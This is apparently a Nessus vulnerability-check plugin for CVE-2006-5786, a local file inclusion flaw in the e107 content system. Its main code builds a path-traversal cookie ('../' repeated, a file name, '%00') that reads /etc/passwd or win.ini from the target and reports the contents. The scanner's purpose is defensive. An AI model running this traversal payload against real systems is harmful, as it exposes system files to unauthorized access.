#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(23624);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2006-5786");
  script_bugtraq_id(20913);
  script_osvdb_id(33920);
  script_xref(name:"EDB-ID", value:"2711");

  script_name(english:"e107 class2.php e107language_e107cookie Cookie Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file with e107");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
local file include issue."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The 'class2.php' script included with the version of e107 installed on
the remote host contains a programming flaw that manipulation through
a cookie variable the 'e_LANGUAGE' variable, which is used in PHP
'include_once()' functions.  Regardless of PHP's settings, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id."
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to version 0.7.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/11/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/11/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/11/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);

dir = install['dir'];

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  cookie = mult_str(str:"../", nb:12) + file + "%00";
  set_http_cookie(name: 'e107language_e107cookie', value: cookie);
  res = http_send_recv3(
    method : 'GET',
    item   : dir + "/gsitemap.php",
    port   : port,
    exit_on_fail : TRUE
  );

  # There's a problem if there's an entry for root.
  if (egrep(pattern:file_pats[file], string: res[2]))
  {
    if (report_verbosity > 0)
    {
      max = 15;
      contents = res[2] - strstr(res[2], "<?xml version");
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          "Here are the contents of the file '" +file+ "' that Nessus" +
          '\n' + "was able to read from the remote host limited to " + max +
          " lines :" +
          '\n' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:contents, max_lines:max) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", build_url(qs:dir, port:port));
